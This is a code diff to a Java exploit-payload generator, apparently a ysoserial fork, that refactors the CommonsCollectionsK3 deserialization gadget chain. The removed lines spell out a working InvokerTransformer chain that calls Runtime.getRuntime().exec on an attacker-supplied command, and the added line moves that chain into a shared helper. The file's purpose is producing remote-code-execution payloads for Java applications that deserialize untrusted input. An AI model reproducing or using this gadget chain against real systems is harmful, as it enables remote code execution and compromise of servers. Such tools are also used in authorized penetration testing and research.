@@ -1,5 +1,6 @@
 package me.gv7.woodpecker.yso.payloads;
 
+import me.gv7.woodpecker.yso.payloads.custom.CommonsCollectionsUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -30,19 +31,7 @@ Gadget chain:
 public class CommonsCollectionsK3 extends PayloadRunner implements ObjectPayload<Map> {
 
     public Map getObject(final String command) throws Exception {
-        final String[] execArgs = new String[]{command};
-
-        final Transformer[] transformers = new Transformer[]{
-            new ConstantTransformer(Runtime.class),
-            new InvokerTransformer("getMethod", new Class[]{
-                String.class, Class[].class}, new Object[]{
-                "getRuntime", new Class[0]}),
-            new InvokerTransformer("invoke", new Class[]{
-                Object.class, Object[].class}, new Object[]{
-                null, new Object[0]}),
-            new InvokerTransformer("exec",
-                new Class[]{String.class}, execArgs),
-            new ConstantTransformer(new HashSet<String>())};
+        final Transformer[] transformers = CommonsCollectionsUtil.getTransformerList(command);
 
         ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
 
